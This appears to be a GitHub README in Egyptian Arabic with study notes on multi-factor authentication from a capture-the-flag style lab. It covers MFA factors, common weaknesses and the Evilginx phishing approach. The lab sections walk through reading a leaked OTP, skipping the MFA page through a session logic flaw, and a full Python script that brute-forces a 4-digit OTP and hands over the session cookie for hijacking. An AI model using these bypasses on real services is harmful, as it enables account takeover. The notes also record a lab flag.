# Multi-Factor Authentication

<img width="1900" height="358" alt="image" src="https://github.com/user-attachments/assets/ceea8ffa-4f26-444d-81d9-8b623f501f22" />


---


<details>
  <summary>How MFA Works</summary>


يعني إيه MFA أصلاً؟
===================

**MFA = Multi-Factor Authentication**

يعني بدل ما تعتمد على حاجة واحدة (زي الباسورد)،\
تعتمد على **عاملين أو أكتر مختلفين** عشان تثبت إنك أنت صاحب الحساب.

> الهدف: حتى لو الهاكر عرف الباسورد، يفضل مش عارف يدخل.

* * * * *

الفرق بين MFA و 2FA
===================

-   **2FA** = لازم بالظبط عاملين

-   **MFA** = عاملين أو أكتر

يعني:\
كل 2FA هو MFA\
لكن مش كل MFA هو 2FA

مثال:

-   Password + Fingerprint = 2FA

-   Password + Fingerprint + Smart Card = MFA (مش 2FA)

* * * * *

أنواع عوامل التحقق (Authentication Factors)
===========================================

MFA بيعتمد على 5 أنواع:

* * * * *

1️⃣ Something You Know
----------------------

حاجة إنت حافظها

-   Password

-   PIN

-   Security question

⚠️ المشكلة؟\
ممكن تتسرق (Phishing -- Brute force -- Credential stuffing)

* * * * *

2️⃣ Something You Have
----------------------

حاجة معاك

-   موبايل عليه Authenticator

-   Smart card

-   Security token

-   Client certificate

الفكرة: لازم تكون ماسك الجهاز فعليًا

* * * * *

3️⃣ Something You Are
---------------------

Biometrics 👁️

-   Fingerprint

-   Face recognition

-   Iris scan

⚠️ مهمة جدًا:\
البيومتريكس عمرها ما بتطابق 100%\
عشان كده **مينفعش تعتمد عليها لوحدها**

* * * * *

4️⃣ Somewhere You Are
---------------------

المكان

-   IP Address

-   Geolocation

مثال:\
لو دايمًا بتدخل من مصر\
وفجأة Login من روسيا\
النظام يطلب OTP إضافي

* * * * *

5️⃣ Something You Do
--------------------

سلوكك

-   طريقة الكتابة

-   حركة الماوس

-   سرعة الضغط على الكيبورد

ده اسمه Behavioral Biometrics\
وأصعب نوع يتنفذ.

* * * * *

أشهر أنواع 2FA عمليًا
=====================

* * * * *

🔹 TOTP (Time-Based One-Time Password)
--------------------------------------

Google Authenticator\
Microsoft Authenticator\
Authy

-   الكود بيتغير كل 30 ثانية

-   بيتحسب من Secret Key + الوقت الحالي

-   حتى لو حد عرف الكود دلوقتي، بعد نص دقيقة خلاص انتهى

🔥 ده أقوى بكتير من SMS

* * * * *

🔹 Push Notification
--------------------

زي:

-   Duo

-   Google Prompt

بيجيلك إشعار:

> هل إنت بتحاول تسجل دخول؟

تضغط Approve أو Deny

⚠️ هنا ظهر هجوم اسمه:\
**MFA Fatigue Attack**

المهاجم يفضل يبعتلك Push كتير\
لحد ما تزهق وتضغط Approve بالغلط.

حصل ده فعلًا مع موظف في شركة Uber.

* * * * *

🔹 SMS
------

يوصل كود على الموبايل.

⚠️ ضعيف نسبيًا بسبب:

-   SIM swapping

-   SS7 attacks

-   اعتراض الرسائل

* * * * *

🔹 Hardware Tokens
------------------

زي:

YubiKey

-   جهاز صغير بيديك OTP

-   أو بيستخدم NFC

-   مش محتاج بطارية

-   شغال Offline

🔥 ده من أقوى أنواع الحماية

* * * * *

Conditional Access (مستوى الشركات الكبير)
=========================================

ده بقى الذكاء الحقيقي 👇

النظام يغير مستوى الأمان حسب الظروف.

* * * * *

📍 Location-Based
-----------------

من المكتب → Password بس\
من دولة غريبة → Password + OTP + Biometric

* * * * *

⏰ Time-Based
------------

وقت الشغل → عادي\
بعد الساعة 3 الفجر → Verification إضافي

* * * * *

🧠 Behavioral Analysis
----------------------

لو فجأة بدأت:

-   تدخل ملفات مش بتدخلها

-   في أوقات غريبة

-   من جهاز جديد

النظام يطلب تحقق إضافي

* * * * *

💻 Device-Specific
------------------

لو جهازك مش مسجل في الشركة\
ممكن يمنعك تدخل أصلًا

* * * * *

ليه العالم كله بيتجه لـ MFA؟
============================

عشان بيمنع:

-   Phishing

-   Password leaks

-   Brute force

-   Credential stuffing

-   Social engineering

كتير من الاختراقات الكبيرة كان ممكن تتمنع لو فيه MFA:

-   اختراق Equifax 2017

-   اختراق Target 2013








<img width="1338" height="172" alt="image" src="https://github.com/user-attachments/assets/82929cda-686f-4b72-a447-23a365f8a5d6" />






  
</details>





<details>
  <summary>Implementations and Applications</summary>


ليه MFA بقى أساسي دلوقتي؟
=========================

عشان كل القطاعات بقت معتمدة على الإنترنت والأنظمة الرقمية:

-   فلوس أونلاين 💰

-   ملفات طبية 🏥

-   بيانات شركات وأسرار أعمال 🏢

أي اختراق هنا = خسائر بملايين.

عشان كده MFA بقى **خط دفاع أساسي** مش رفاهية.

* * * * *

🏦 أولاً: MFA في البنوك
=======================

البنوك بتتعامل مع:

-   حسابات

-   تحويلات

-   بطاقات

-   قروض

-   بيانات شخصية

لو اعتمدت على Password بس → كارثة.

### السيناريو الطبيعي:

1️⃣ تدخل Username + Password (Something you know)\
2️⃣ يوصلك OTP على الموبايل أو App (Something you have)

يعني حتى لو:

-   الباسورد اتسرب

-   حصل Phishing

-   حصل Keylogger

المهاجم لسه محتاج الموبايل.

🔥 ده بيقلل جدًا:

-   Account takeover

-   Online fraud

-   Transaction hijacking

* * * * *

🏥 ثانيًا: MFA في الرعاية الصحية
================================

القطاع الطبي أخطر بكتير مما الناس متخيلة.

بيانات المرضى تشمل:

-   تقارير طبية

-   تشخيصات

-   أدوية

-   بيانات شخصية

وفي أمريكا مثلًا فيه قانون اسمه:

HIPAA

القانون ده بيفرض حماية قوية للبيانات الصحية.

### مثال عملي:

دكتور عايز يدخل على نظام الـ EHR (Electronic Health Records)

ممكن يُطلب منه:

-   كارت أمني (Something you have)

-   بصمة (Something you are)

ليه؟\
عشان لو حد سرق الباسورد مش هيقدر يفتح النظام من غير الكارت + البصمة.

🔥 ده يمنع:

-   تسريب بيانات مرضى

-   تعديل تشخيصات

-   سرقة معلومات حساسة

* * * * *

🏢 ثالثًا: MFA في Corporate IT
==============================

الشركات عندها:

-   أسرار تجارية

-   سورس كود

-   قواعد بيانات عملاء

-   خطط مالية

أي اختراق = تجسس صناعي أو خسارة سمعة.

### السيناريو المعتاد:

1️⃣ Employee يدخل بياناته\
2️⃣ يوصله كود على موبايل الشركة\
أو يستخدم:

-   Face recognition

-   Fingerprint

لو حد حاول يخترق من:

-   دولة تانية

-   جهاز مش معروف

-   وقت غريب

النظام ممكن يطلب تحقق إضافي.

🔥 هنا MFA بيمنع:

-   Lateral movement

-   Privilege escalation

-   Data exfiltration










  
</details>





<details>
  <summary>Common Vulnerabilities in MFA</summary>



1️⃣ Weak OTP Generation Algorithms
==================================

الـ OTP المفروض يكون:

-   عشوائي

-   غير قابل للتنبؤ

-   بيتغير باستمرار

لكن لو المطور استخدم:

-   `Math.random()` بطريقة بدائية

-   Seed ثابت

-   رقم بيتولد بناءً على الوقت بس

-   أو counter بسيط

ساعتها الأرقام ممكن يبقى ليها Pattern.

### مثال خطر:

لو التطبيق بيولد OTP بالشكل ده:

current_timestamp % 1000000

ساعتها:

-   أي حد يعرف الوقت تقريبًا

-   يقدر يتوقع الرقم

🔥 ده بيحول OTP من "حماية قوية" إلى "لغز سهل".

* * * * *

2️⃣ Application Leaking the 2FA Token
=====================================

دي كارثة كلاسيكية في CTFs 😈

السيناريو:

1️⃣ تسجل دخول\
2️⃣ تتحول لصفحة 2FA\
3️⃣ التطبيق يعمل XHR request\
4️⃣ الـ API يرجع الرد...\
5️⃣ المفاجأة 😳

الـ Response يحتوي على:

{\
   "otp": "483921"\
}

يعني التطبيق نفسه سلّمك المفتاح!

ده بيحصل بسبب:

-   Insecure API design

-   Debug code متشالش

-   Poor backend validation

🔥 هنا المهاجم مش محتاج يخمن... هو شايف الكود قدامه.

* * * * *

3️⃣ Brute Forcing the OTP
=========================

الـ OTP غالبًا 6 أرقام:

000000 → 999999

يعني مليون احتمال بس.

لو مفيش حماية:

-   ممكن أعمل Script

-   أجرب كل الاحتمالات بسرعة

لو التطبيق:

-   مش بيقفل بعد عدد محاولات

-   مش بيضيف delay

-   مش بيربط OTP بالجلسة

يبقى قابل للكسر.

زي خزنة بتلف الرقم لحد ما تفتح.

* * * * *

4️⃣ Lack of Rate Limiting
=========================

دي بقى المشكلة الأكبر 👀

لو تقدر تبعت:

-   1000 request في الثانية

-   بدون أي حظر

-   بدون Captcha

-   بدون account lock

يبقى الموضوع مسألة وقت.

في تقارير Bug Bounty كتير اتقبلت بسبب:

-   مفيش rate limit

-   أو الـ rate limit على IP بس

-   تقدر تغير IP وتكمل

🔥 ودي ثغرة شائعة جدًا في التطبيقات الصغيرة.

* * * * *

5️⃣ Evilginx (الجزء المرعب 😈)
==============================

Evilginx

ده Tool بيستخدم في Red Team engagements.

فكرته:\
مش بيكسر MFA\
هو "يعدّي" من خلاله.

إزاي؟
-----

1️⃣ المهاجم يبعتلك لينك Phishing\
2️⃣ الصفحة شكلها مطابق 100% للموقع الحقيقي\
3️⃣ إنت تدخل:

-   Username

-   Password\
    4️⃣ يطلب منك OTP\
    5️⃣ تدخل OTP\
    6️⃣ Evilginx يمرر البيانات للموقع الحقيقي\
    7️⃣ الموقع يدي Session Cookie\
    8️⃣ Evilginx يخطف الـ Cookie

🔥 والكوكي دي هي المفتاح الحقيقي.

المهاجم مش محتاج OTP تاني\
لأنه ماسك Session valid.

ده اسمه:\
**Adversary-in-the-Middle attack**

* * * * *

ليه ده خطير؟
============

لأن حتى:

-   TOTP

-   Push

-   SMS

ممكن يتخطوا بالطريقة دي\
لو المستخدم وقع في phishing.

* * * * *

الخلاصة الأمنية 👇
==================

MFA قوي... لكن:

-   لازم OTP يكون عشوائي فعلاً

-   لازم فيه Rate limiting

-   لازم فيه Account lockout

-   لازم التحقق يتم في السيرفر

-   لازم حماية ضد phishing (زي FIDO2 / WebAuthn)



<img width="1237" height="737" alt="image" src="https://github.com/user-attachments/assets/b4c2a778-9321-4934-8d5e-e1873e499827" />






  
</details>



<details>
  <summary>Practical - OTP Leakage</summary>




💥 يعني إيه OTP Leakage؟
========================

المفروض الـ OTP:

-   يتولد في السيرفر

-   يتبعت للمستخدم (SMS / App)

-   المستخدم يدخله

-   السيرفر يتحقق منه داخليًا

لكن هنا اللي حصل 👇\
التطبيق رجّع الـ OTP نفسه جوه الـ XHR Response!

يعني بدل ما يقول:

{ "status": "sent" }

رجّع:

{ "token": "483921" }

🔥 كده التطبيق سلّم المفتاح للمهاجم بنفسه.

* * * * *

📌 ليه ده بيحصل؟
================

1️⃣ Server-Side Validation غلط
------------------------------

السيرفر بدل ما:

-   يتحقق بس

-   ويرجع Success أو Failure

رجّع القيمة الحساسة نفسها.

أحيانًا ده بيكون:

-   Debug feature

-   Logging

-   Response مش متفلتر

* * * * *

2️⃣ ضعف Secure Coding Practices
-------------------------------

بعض المطورين:

-   مركزين يخلو السيستم يشتغل

-   مش مركزين إزاي مهاجم ممكن يستغل الـ response

وده بيحصل كتير في:

-   مشاريع صغيرة

-   أنظمة داخلية

-   تطبيقات تعليمية

* * * * *

3️⃣ Debug Info متشالش من Production
-----------------------------------

أثناء التطوير:\
المطور يحط:

{ "otp": "483921", "debug": true }

ينسى يشيله قبل ما يرفع السيستم Live 😬

وده خطأ كلاسيكي جدًا.

* * * * *

🛠️ الاستغلال عمليًا (زي اللي في اللاب)
=======================================

### الخطوات:

1️⃣ تدخل بيانات:

thm@mail.thm\
test123

2️⃣ تفتح Developer Tools (F12)

3️⃣ تروح تبويب:

Network

4️⃣ تلاحظ فيه Request رايح لـ:

/token

5️⃣ تفتح الـ Response

تلاقي:

{ "token": "739281" }

6️⃣ تاخد الرقم\
7️⃣ تحطه في خانة OTP\
8️⃣ تضغط Verify

🎯 دخلت بدون ما تستلم SMS ولا App.




<img width="1670" height="656" alt="image" src="https://github.com/user-attachments/assets/e2d77b5c-7487-40d6-b1bc-bb4083f75b9f" />



<img width="1742" height="811" alt="image" src="https://github.com/user-attachments/assets/ede1262d-5045-4dc6-87d9-a22e74e8241f" />

<img width="1618" height="548" alt="image" src="https://github.com/user-attachments/assets/d0b91432-0270-42f9-8bd8-7d33a52bd580" />


```
 904c8ac84e44f0ba942e9e11ee7037b8 
```





  
</details>






<details>
  <summary>Practical - Insecure Coding</summary>



🎯 الفكرة الأساسية
==================

التطبيق المفروض يمشي كده:

1️⃣ Username + Password\
2️⃣ يوديك صفحة 2FA\
3️⃣ تدخل OTP\
4️⃣ لو صح → تدخل Dashboard

لكن هنا حصل غلط في المنطق.

* * * * *

🧠 السيناريو الطبيعي (المفروض يحصل)
===================================

في صفحة `/mfa`:

if (verify_2fa_code($_POST['code'])) {\
    $_SESSION['authenticated'] = true;\
    header('Location: /dashboard');\
}

هنا صح 👌\
الـ session بتتعمل بعد ما OTP يتأكد.

يعني:

-   لو OTP غلط → مفيش session

-   لو OTP صح → يفتحلك الداشبورد

* * * * *

💣 المشكلة حصلت فين؟
====================

بص على الجزء ده 👇

if (authenticate($email, $password)) {\
    $_SESSION['authenticated'] = true;  // ❌ غلط\
    $_SESSION['email'] = $_POST['email'];\
    header('Location: /mfa');\
}

🔥 هنا الكارثة.

المطور عمل:

$_SESSION['authenticated'] = true;

بعد Step 1 بس (الباسورد).

مع إن المفروض ده يحصل بعد Step 2 (الـ OTP).

* * * * *

📌 ليه ده خطير؟
===============

لأن الداشبورد بيعمل Check بسيط:

if ($_SESSION['authenticated'] === true)

ومش بيفرق:

-   هل ده بعد 2FA؟

-   ولا بعد الباسورد بس؟

يعني أول ما تسجل دخول:

-   السيرفر بالفعل معلمك authenticated

-   حتى قبل ما تدخل OTP

* * * * *

💥 الاستغلال عمليًا
===================

بعد ما تدخل:

thm@mail.thm\
test123

الموقع يوديك:

/mfa

لكن بدل ما تدخل OTP...

تكتب مباشرة:

/dashboard

🎯 تدخل عادي\
لأن session flag already true.

* * * * *

🧠 ليه ده اسمه Logic Flaw؟
==========================

لأن:

-   مفيش Bug في التشفير

-   مفيش كسر OTP

-   مفيش تسريب

المشكلة في ترتيب المنطق نفسه.

الـ authentication state اتعمل بدري زيادة عن اللزوم.

* * * * *

👀 دي بتيجي منين؟
=================

-   سوء فهم لفكرة multi-step authentication

-   خلط بين:

    -   Logged in

    -   Fully authenticated

-   استخدام Flag واحد لكل المراحل

* * * * *

🛡️ الحل الصح (Remediation)
===========================

المفروض نقسم الـ session لمرحلتين:

✅ المرحلة الأولى:
-----------------

بعد الباسورد:

$_SESSION['pre_authenticated'] = true;

وده بس يسمح لك توصل لصفحة `/mfa`

* * * * *

✅ المرحلة الثانية:
------------------

بعد OTP:

$_SESSION['authenticated'] = true;

والداشبورد يعمل check على:

if ($_SESSION['authenticated'] === true)

مش على الـ pre-auth.
















  
</details>







<details>
  <summary>Practical - Beating the Auto-Logout Feature</summary>



🎯 الفكرة الأساسية
==================

التطبيق بيعمل الآتي:

1️⃣ تدخل Username + Password\
2️⃣ يوديك صفحة 2FA\
3️⃣ لو OTP غلط → يعمل Logout\
4️⃣ لازم تعيد تسجيل الدخول من الأول

الفكرة الأمنية هنا:

> نحبط brute force على OTP

لكن 👀\
لو الـ OTP ضعيف + مفيش rate limiting صح...\
الـ automation هيكسب.

* * * * *

🧠 المشكلة الحقيقية في اللاب ده
===============================

بص على الكود:

$token = strval(rand(1250, 1350));

يعني:

-   OTP بين 1250 و 1350

-   يعني تقريبًا 100 احتمال بس 😳

🔥 ده رقم صغير جدًا.

حتى لو التطبيق بيعمل Logout بعد كل محاولة\
مفيش حاجة تمنعنا نعمل:

Login → Try OTP → Logout\
Login → Try OTP → Logout\
Login → Try OTP → Logout

بسرعة جدًا باستخدام Script.

* * * * *

💻 ليه Automation مهمة هنا؟
===========================

لأن يدويًا الموضوع مرهق:

-   تسجل دخول

-   تدخل OTP

-   تغلط

-   تترمي بره

-   تعيد من الأول

لكن Script يقدر يعمل ده في ثواني.

* * * * *

🛠️ إزاي السكريبت بيشتغل؟
=========================

السكريبت بيعمل Loop لا نهائي:

while True:\
    login()\
    submit_otp()

الخطوات:
--------

### 1️⃣ يعمل Login

session.post(login_url, credentials)

لو نجح → يروح خطوة OTP

* * * * *

### 2️⃣ يجرب OTP

في المثال OTP ثابت 1337 (للتوضيح)

لكن عمليًا المفروض تعمل Loop:

for otp in range(1250, 1351):

* * * * *

### 3️⃣ يشوف الرد

لو رجع:

302 redirect → /dashboard

يبقى نجح 🎯

لو رجع:

redirect → login

يبقى فشل ويعيد المحاولة

* * * * *

🍪 الجزء المهم جدًا: Session Hijacking
======================================

بعد ما ينجح:

السكريبت بيطبع:

Session cookies: {'PHPSESSID': '57burqsvce3odaif2oqtptbl13'}

دي الجلسة اللي نجحت في التحقق.

تروح تحطها يدويًا في المتصفح:

Developer Tools → Storage → Cookies\
تستبدل قيمة PHPSESSID

وتفتح:

/dashboard

🔥 دخلت كأنك صاحب الحساب.

* * * * *

🧠 ليه ده حصل؟
==============

لأن فيه 3 مشاكل:

❌ 1. OTP ضعيف جدًا
------------------

مش 4 أرقام كاملة\
نطاق صغير جدًا

* * * * *

❌ 2. مفيش Rate Limiting حقيقي
-----------------------------

بيعمل Logout بس\
مش بيمنع المحاولات

* * * * *

❌ 3. مفيش Account Lock
----------------------

حتى بعد 100 محاولة\
الحساب مش بيتقفل






```python
import requests

# Define the URLs for the login, 2FA process, and dashboard
login_url = 'http://mfa.thm/labs/third/'
otp_url = 'http://mfa.thm/labs/third/mfa'
dashboard_url = 'http://mfa.thm/labs/third/dashboard'

# Define login credentials
credentials = {
    'email': 'thm@mail.thm',
    'password': 'test123'
}

# Define the headers to mimic a real browser
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://mfa.thm',
    'Connection': 'close',
    'Referer': 'http://mfa.thm/labs/third/mfa',
    'Upgrade-Insecure-Requests': '1'
}

# Function to check if the response contains the login page
def is_login_successful(response):
    return "User Verification" in response.text and response.status_code == 200

# Function to handle the login process
def login(session):
    response = session.post(login_url, data=credentials, headers=headers)
    return response
  
# Function to handle the 2FA process
def submit_otp(session, otp):
    # Split the OTP into individual digits
    otp_data = {
        'code-1': otp[0],
        'code-2': otp[1],
        'code-3': otp[2],
        'code-4': otp[3]
    }
    
    response = session.post(otp_url, data=otp_data, headers=headers, allow_redirects=False)  # Disable auto redirects
    print(f"DEBUG: OTP submission response status code: {response.status_code}")
    
    return response

# Function to check if the response contains the login page
def is_login_page(response):
    return "Sign in to your account" in response.text or "Login" in response.text

# Function to attempt login and submit the hardcoded OTP until success
def try_until_success():
    otp_str = '1337'  # Hardcoded OTP

    while True:  # Keep trying until success
        session = requests.Session()  # Create a new session object for each attempt
        login_response = login(session)  # Log in before each OTP attempt
        
        if is_login_successful(login_response):
            print("Logged in successfully.")
        else:
            print("Failed to log in.")
            continue

        print(f"Trying OTP: {otp_str}")

        response = submit_otp(session, otp_str)

        # Check if the response is the login page (unsuccessful OTP)
        if is_login_page(response):
            print(f"Unsuccessful OTP attempt, redirected to login page. OTP: {otp_str}")
            continue  # Retry login and OTP submission

        # Check if the response is a redirect (status code 302)
        if response.status_code == 302:
            location_header = response.headers.get('Location', '')
            print(f"Session cookies: {session.cookies.get_dict()}")

            # Check if it successfully bypassed 2FA and landed on the dashboard
            if location_header == '/labs/third/dashboard':
                print(f"Successfully bypassed 2FA with OTP: {otp_str}")
                return session.cookies.get_dict()  # Return session cookies after successful bypass
            elif location_header == '/labs/third/':
                print(f"Failed OTP attempt. Redirected to login. OTP: {otp_str}")
            else:
                print(f"Unexpected redirect location: {location_header}. OTP: {otp_str}")
        else:
            print(f"Received status code {response.status_code}. Retrying...")

# Start the attack to try until success
try_until_success()
```

<img width="976" height="345" alt="image" src="https://github.com/user-attachments/assets/18710b3b-6249-4a80-84fa-afa37a33c729" />




<img width="1625" height="670" alt="image" src="https://github.com/user-attachments/assets/19bd2ffe-1236-48c9-8fc7-d0df04e8a011" />




  
</details>







































































